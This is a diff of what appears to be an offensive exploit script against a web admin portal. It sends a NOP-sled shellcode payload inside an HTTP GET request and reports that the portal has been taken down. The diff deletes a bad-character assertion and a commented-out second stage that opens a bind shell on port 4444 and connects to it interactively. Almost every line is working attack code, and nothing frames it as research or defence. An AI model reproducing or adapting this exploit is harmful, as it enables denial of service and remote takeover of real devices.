@@ -192,8 +192,6 @@ def dos_admin_portal(target_url: str):
     payload += nop * 100
     payload += read_shell
 
-    assert all(c not in avoid for c in read_shell)
-
     # Construct HTTP GET request with headers
     request = b"GET /loginFs/passwd HTTP/1.1\r\n"
     request += f"Host: {target_url}\r\n".encode()
@@ -203,17 +201,6 @@ def dos_admin_portal(target_url: str):
     request += b"\r\n"
 
     io.send(request)
-    """
-    pause()
-
-    # stage 2
-    shell = asm(shellcraft.bindsh(4444))
-    io.send(shell)
-    io.interactive()
-    ip = get_ip()
-    sh1 = remote(ip, 4444)
-    sh1.interactive()
-    """
     print(f"[+] The Admin Portal has been successfully taken down!")
 
 
